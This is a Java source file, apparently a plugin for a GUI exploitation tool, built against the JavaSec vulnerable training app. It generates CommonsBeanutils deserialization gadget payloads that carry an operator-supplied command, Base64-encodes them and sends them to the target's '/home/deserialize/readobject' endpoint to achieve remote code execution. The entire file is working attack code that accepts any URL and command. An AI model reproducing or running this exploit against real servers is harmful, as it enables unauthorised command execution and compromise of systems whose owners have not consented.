package org.jiu.exploit.javasec;

import cn.hutool.core.codec.Base64;
import me.gv7.woodpecker.requests.RawResponse;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.yso.payloads.CommonsBeanutils1;
import me.gv7.woodpecker.yso.payloads.CommonsBeanutils2;
import me.gv7.woodpecker.yso.payloads.ObjectPayload;
import me.gv7.woodpecker.yso.payloads.util.PayloadRunner;
import org.jiu.form.DeserForm;
import org.jiu.templates.TabContent;
import org.jiu.utils.ProxyManager;
import org.jiu.utils.Utils;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

public class JavaSecDerserRCE implements TabContent {
    private JTabbedPane tabbedPane;
    private DeserForm deserForm;
    private String url;
    private String command;
    private HashMap<String, String> headers = new HashMap<>();
    private String gadget;
    private static final Map<String, Class<? extends ObjectPayload<?>>> gadgetMap = new HashMap<>();

    // 这里是你的gadget,同时也需要在ui修改
    static {
        gadgetMap.put("CommonsBeanutils1", CommonsBeanutils1.class);
        gadgetMap.put("CommonsBeanutils2", CommonsBeanutils2.class);
    }
    // 修改下面参数
    public String name = "JavaSecDerserRCE"; // 漏洞名
    public String product = "DeserRCE";             // 类型
    public String desc = "JavaSec 靶场反序列化漏洞";  // 描述
    public String author = "xm17";              // 作者
    public String className = "org.jiu.exploit.javasec.JavaSecDerserRCE"; // 类名(必须)
    public String tabName = "JavaSecDerserRCE";  // tab显示名称
    public String tips = "JavaSec 靶场反序列化漏洞 使用的是woodpecker-ysoserial 命令自己参考一下";    // 提示


    public JavaSecDerserRCE() {
    }

    public JavaSecDerserRCE(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }

    @Override
    public void init() {
        deserForm = new DeserForm();
    }

    @Override
    public JPanel getPanel() {
        return deserForm.DeserForm;
    }

    @Override
    public String getTabName() {
        return tabName;
    }

    @Override
    public void exploit() {
        deserForm.tipsLabel.setText(tips);


        // Use an array to hold the SwingWorker reference
        final SwingWorker[] worker = new SwingWorker[1];

        deserForm.startButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // Create and execute the background task
                worker[0] = new SwingWorker<String, Void>() {
                    @Override
                    protected String doInBackground() throws Exception {
                        url = Utils.removeTrailingSlash(deserForm.urlField.getText());
                        gadget = Objects.requireNonNull(deserForm.gadgetcomboBox.getSelectedItem()).toString();
                        command = deserForm.commandtextField.getText();
                        headers = Utils.getHeaders(deserForm.headertextArea.getText());
                        // 使用 StringBuilder 来收集结果
                        StringBuilder resultOutPrint = new StringBuilder();
                        byte[] payload = new byte[]{};
                        try {
                            Class<? extends ObjectPayload<?>> clazz = gadgetMap.get(gadget);
                            payload = PayloadRunner.getPayload(clazz, new String[]{command});
                        } catch (Exception ex) {
                            throw new RuntimeException(ex);
                        }
                        // 对payloadObject进行BASE64编码
                        String encoded = Base64.encode(payload);

                        HashMap<String,String> params = new HashMap<>();
                        params.put("content",encoded);
                        try {
                            // 接下来写实现发包逻辑
                            // 发送请求
                            RawResponse rawResponse = Requests.get(url + "/home/deserialize/readobject")
                                    .params(params)
                                    .verify(false)
                                    .proxy(ProxyManager.Proxy())
                                    .headers(headers)
                                    .send();
                            resultOutPrint.append(rawResponse.readToText()).append("\n\n==========================\n\n");
                        } catch (Exception ex) {
                            return "上传失败: " + ex.getMessage();
                        }

                        return resultOutPrint.toString();
                    }

                    @Override
                    protected void done() {
                        try {
                            String result = get(); // 获取结果
                            deserForm.resultArea.setText(result);
                        } catch (Exception ex) {
                            deserForm.resultArea.setText("出现错误: " + ex.getMessage());
                        }
                    }
                };

                worker[0].execute(); // 执行任务
            }
        });

        // 添加停止按钮的逻辑
        deserForm.stopButton.addActionListener(new AbstractAction() {
            @Override
            public void actionPerformed(ActionEvent e) {
                // 停止上传的逻辑
                if (worker[0] != null) {
                    worker[0].cancel(true); // 取消上传操作
                    deserForm.resultArea.setText("已被停止。");
                }
            }
        });
    }

    public void setTabbedPane(JTabbedPane tabbedPane) {
        this.tabbedPane = tabbedPane;
    }
}
